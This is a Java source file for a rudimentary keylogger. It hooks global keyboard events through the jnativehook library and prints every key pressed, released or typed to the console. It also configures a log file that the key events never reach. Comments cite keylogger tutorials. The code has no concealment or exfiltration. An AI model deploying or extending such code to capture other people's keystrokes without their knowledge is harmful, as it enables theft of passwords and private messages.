import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Properties;
import java.util.logging.FileHandler;
import java.util.logging.Logger;
import java.util.logging.SimpleFormatter;

import javax.swing.text.BadLocationException;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.NativeInputEvent;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;


public class KeyLogger implements NativeKeyListener {
	String configFilePath = null;
	Logger logger = null;
	FileHandler fileHandler = null;
	SimpleFormatter simpleFormatter = null;
	InputStream inputStream = null;
	Properties properties = null;
	Path currentRelativePath = null;

	/**
	 * The constructor.
	 * @throws IOException
	 */
	public KeyLogger() throws IOException {
		logger = Logger.getLogger("Key Log");
		currentRelativePath = Paths.get("");
		inputStream = new FileInputStream("Config.properties");
		properties = new Properties();
		properties.load(inputStream);
		configFilePath = properties.getProperty("FilePath");
		fileHandler = new FileHandler(configFilePath);
		logger.addHandler(fileHandler);
		simpleFormatter = new SimpleFormatter();
		fileHandler.setFormatter(simpleFormatter);
	}

	private void displayEventInfo(final NativeInputEvent e) {

		String a= e.paramString();
		System.out.println(a);
		
	}
	
	/* Key Pressed */
    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        
        displayEventInfo(e);
    }
 
    /* Key Released */
    public void nativeKeyReleased(NativeKeyEvent e) {
        System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }
 
    /* I can't find any output from this call */
    public void nativeKeyTyped(NativeKeyEvent e) {
        System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
    }

	/**
	 * The main method.
	 * @param arguments - Command-line arguments
	 * @throws IOException
	 * @throws NativeHookException
	 */
	public static void main(String arguments[]) throws IOException, NativeHookException {
		GlobalScreen.registerNativeHook();
		GlobalScreen.addNativeKeyListener(new KeyLogger());
	}
	//https://juanpinzon-1992.blogspot.com.co/2014/10/como-crear-un-key-logger-en-java.html
	//https://github.com/kwhat/jnativehook
	//https://github.com/samir-joglekar/keylogger-java
	//https://stackoverflow.com/questions/15758685/how-to-write-logs-in-text-file-when-using-java-util-logging-logger/15758768
	//https://github.com/kwhat/jnativehook/blob/2.1/src/java/org/jnativehook/example/NativeHookDemo.java
}